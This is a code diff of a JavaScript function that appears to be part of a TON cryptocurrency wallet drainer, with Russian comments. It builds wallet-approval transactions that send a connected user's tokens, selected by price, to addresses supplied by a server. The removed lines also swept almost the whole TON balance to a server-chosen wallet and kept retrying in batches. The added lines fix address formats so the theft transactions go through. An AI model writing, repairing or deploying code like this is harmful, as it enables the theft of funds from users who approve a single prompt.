@@ -189,10 +189,14 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         i, 
         tryies, 
         tonFlag, 
-        jettonsCount: Object.keys(data.data.boc).length,
-        tonBalance: ton,
-        tonPrice: tonPrice
+        jettonsCount: Object.keys(data.data.boc).length 
     });
+    
+    // Проверяем данные
+    if (!data || !data.data || !data.data.boc) {
+        console.error('Invalid data in sendJettons');
+        return;
+    }
     
     let adr = new TonWeb.utils.Address(walletAddress);
     if (i < 0) i = 0;
@@ -201,8 +205,9 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     let msgs = 0;
     let tkn = 0;
     let tontx = false;
+    
     const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60,
+        validUntil: Math.floor(Date.now() / 1000) + 180,
         messages: []
     };
     
@@ -212,71 +217,59 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     console.log(`Processing ${len} jettons, starting from index ${i}`);
 
     // Обрабатываем jettons
-    for (let currentIndex = i; currentIndex < len; currentIndex++) {
-        if (msgs >= 4) break; // Максимум 4 сообщения в одной транзакции
-        
+    for (let currentIndex = i; currentIndex < len && msgs < 2; currentIndex++) {
         try {
-            let jettonPrice = parseFloat(data.data.prices[currentIndex]) || 0;
-            let shouldInclude = (ton * tonPrice >= jettonPrice) || (ton * tonPrice < jettonPrice && tonFlag);
-            
-            if (shouldInclude && data.data.boc[currentIndex] && data.data.address[currentIndex]) {
+            if (data.data.boc[currentIndex] && data.data.address[currentIndex]) {
+                // ВАЖНОЕ ИСПРАВЛЕНИЕ: Проверяем и форматируем адрес
+                let jettonAddress = data.data.address[currentIndex];
+                
+                // Если адрес в raw формате (начинается с 0:), конвертируем его
+                if (jettonAddress.startsWith('0:')) {
+                    try {
+                        const addrObj = new TonWeb.utils.Address(jettonAddress);
+                        jettonAddress = addrObj.toString(true, true, false); // bounceable, urlSafe, testOnly=false
+                        console.log(`Converted raw address to TON Connect format: ${jettonAddress}`);
+                    } catch (convError) {
+                        console.error('Error converting address:', convError);
+                        continue; // Пропускаем этот jetton если не можем конвертировать адрес
+                    }
+                }
+                
+                // Проверяем что адрес в правильном формате
+                if (!jettonAddress.includes(':')) {
+                    console.error(`Invalid address format for jetton: ${jettonAddress}`);
+                    continue;
+                }
+                
                 transaction.messages.push({
-                    address: data.data.address[currentIndex],
-                    amount: TonWeb.utils.toNano('0.05').toString(), // Комиссия для jetton трансфера
+                    address: jettonAddress,
+                    amount: TonWeb.utils.toNano('0.1').toString(),
                     payload: data.data.boc[currentIndex]
                 });
                 
                 tokens[tkn] = {
                     name: data.data.name[currentIndex],
-                    prices: jettonPrice
+                    prices: data.data.prices[currentIndex] || 0
                 };
                 tkn++;
                 msgs++;
-                console.log(`Added jetton: ${data.data.name[currentIndex]}, price: ${jettonPrice}$`);
+                console.log(`Added jetton: ${data.data.name[currentIndex]}, address: ${jettonAddress}`);
             }
         } catch (e) {
             console.error('Error adding jetton to transaction:', e);
         }
     }
 
-    // Добавляем TON перевод если нужно
-    if (!tontx && parseFloat(ton) > 0.5 && transaction.messages.length < 4) {
-        try {
-            let transfer_value = TonWeb.utils.toNano(ton) - TonWeb.utils.toNano("0.1");
-            if (transfer_value > 0) {
-                let payload = await get_ton_text(transfer_value);
-                
-                if (payload.status === 'OK' && payload.data) {
-                    transaction.messages.push({
-                        address: data.data.wallet,
-                        amount: transfer_value.toString(),
-                        payload: payload.data
-                    });
-                    
-                    tokens[tkn] = {
-                        name: 'TON',
-                        prices: TonWeb.utils.fromNano(transfer_value.toString()) * tonPrice
-                    };
-                    tkn++;
-                    tontx = true;
-                    console.log('Added TON transfer to transaction:', TonWeb.utils.fromNano(transfer_value.toString()));
-                }
-            }
-        } catch (tonError) {
-            console.error('Error adding TON transfer:', tonError);
-        }
-    }
-
     // Проверяем что есть сообщения для отправки
     if (transaction.messages.length > 0) {
-        // Финальная проверка всех сообщений
+        // Финальная проверка всех адресов
         for (let msg of transaction.messages) {
-            if (!msg.amount || msg.amount === '0') {
-                console.error('Invalid message amount:', msg);
-                msg.amount = TonWeb.utils.toNano('0.05').toString();
+            if (!msg.address || typeof msg.address !== 'string') {
+                console.error('Invalid message address:', msg);
+                return;
             }
-            if (typeof msg.amount !== 'string') {
-                msg.amount = msg.amount.toString();
+            if (!msg.amount || msg.amount === '0') {
+                msg.amount = TonWeb.utils.toNano('0.1').toString();
             }
         }
         
@@ -288,6 +281,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
             currTx = true;
             
             console.log('Sending transaction to blockchain...');
+            
             const result = await tonConnectUI.sendTransaction(transaction);
             console.log('Transaction sent successfully:', result);
             
@@ -304,40 +298,19 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
             await jettons_transaction_done(data123);
             console.log('Jetton transaction completed successfully, hash:', hash);
             
-            // Продолжаем с оставшимися jettons если есть
-            let nextIndex = i + (msgs - (tontx ? 1 : 0));
-            if (nextIndex < len) {
-                console.log(`Continuing with next batch from index: ${nextIndex}`);
-                setTimeout(() => {
-                    sendJettons(data, walletAddress, ton, tonPrice, nextIndex, 0, tontx);
-                }, 2000);
-            } else {
-                console.log('All jettons processed successfully');
-            }
-            
         } catch (error) {
             console.error('Transaction failed:', error);
             
+            if (error.message && error.message.includes('Wrong address format')) {
+                console.log('Address format error - checking address conversion');
+                // Логируем проблемные адреса для отладки
+                transaction.messages.forEach((msg, idx) => {
+                    console.log(`Message ${idx} address: ${msg.address}, type: ${typeof msg.address}`);
+                });
+            }
+            
             if (tryies < maxRetry - 1) {
                 console.log(`Retrying transaction, attempt ${tryies + 2} of ${maxRetry}`);
-                let datas = {
-                    data: tokens,
-                    walletAddress: walletAddress,
-                    ton: ton,
-                    tonPrice: tonPrice,
-                    i: i,
-                    tryies: tryies,
-                    tonFlag: tonFlag,
-                    isTon: tontx
-                };
-                
-                await decline_transfer_jettons_native_request(datas);
-                
-                setTimeout(() => {
-                    sendJettons(data, walletAddress, ton, tonPrice, i, tryies + 1, tonFlag);
-                }, 3000);
-            } else {
-                console.log('Max retries reached, moving to next batch');
                 let datas = {
                     data: tokens,
                     walletAddress: walletAddress,
@@ -594,6 +567,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
